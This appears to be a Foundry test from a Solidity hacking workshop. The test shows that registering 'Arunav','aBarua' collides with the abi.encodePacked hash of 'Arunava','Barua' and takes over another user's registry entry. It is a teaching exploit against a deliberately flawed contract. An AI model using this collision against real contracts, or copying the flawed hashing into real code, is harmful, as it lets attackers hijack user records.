// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Registry} from "../src/SolidityHackingWorkshopV8.sol";

contract Exercise11_Registry is Test {
    Registry public registry;

    function setUp() public {
        registry = new Registry();
    }

    function test_register() public {
        address userA = vm.addr(1);
        bytes32 ID = keccak256(abi.encodePacked("Arunava", "Barua", uint256(1)));

        vm.startPrank(userA);
        registry.register("Arunava", "Barua", 1);
        (address payable regAddress, , , , , ) = registry.users(ID);
        assertEq(userA, regAddress);
        vm.stopPrank();

        registry.register("Arunav", "aBarua", 1);
        (address payable addressAfterAttack, , , , , ) = registry.users(ID);
        assertEq(address(this), addressAfterAttack);
    }
}
